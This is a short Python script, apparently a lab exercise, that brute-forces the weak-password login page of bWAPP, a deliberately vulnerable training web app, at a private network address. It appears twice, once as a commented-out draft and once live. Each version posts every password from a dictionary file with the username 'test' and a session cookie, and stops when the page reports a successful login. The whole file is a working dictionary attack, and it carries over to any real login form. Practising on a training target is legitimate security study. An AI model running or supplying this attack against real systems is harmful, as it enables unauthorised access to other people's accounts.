# import requests
# import os

# url = "http://192.168.0.76/bWAPP/ba_weak_pwd.php"
# cookie = {"security_level":"0", "PHPSESSIC":"51ff92f97e39e20cd84ccb3a85c1d076"}

# # currentPath = os.getcwd()
# # print(currentPath)

# f = open("dict.txt", 'r')

# while True:
#     passwd =f.readline().strip()
#     if not passwd: break
#     data = {"login":"test", "password": passwd, "form":"submit"}
#     res = requests.post(url=url, data=data, cookies=cookie)
#     # print("12")
#     if(res.text.find("Successful login!")>-1):
#         print(passwd)
#         break
# f.close()

import requests

url = "http://192.168.0.76/bWAPP/ba_weak_pwd.php"
cookie = {"security_level":"0", "PHPSESSID":"51ff92f97e39e20cd84ccb3a85c1d076"}

f = open("./dict.txt", 'r')
while True:
    passwd = f.readline().strip()
    if not passwd: break
    data = {"login":"test", "password": passwd, "form":"submit"}
    res = requests.post(url=url, data=data, cookies=cookie)

    if(res.text.find("Successful login!")>-1):
        print(passwd)
        break
f.close()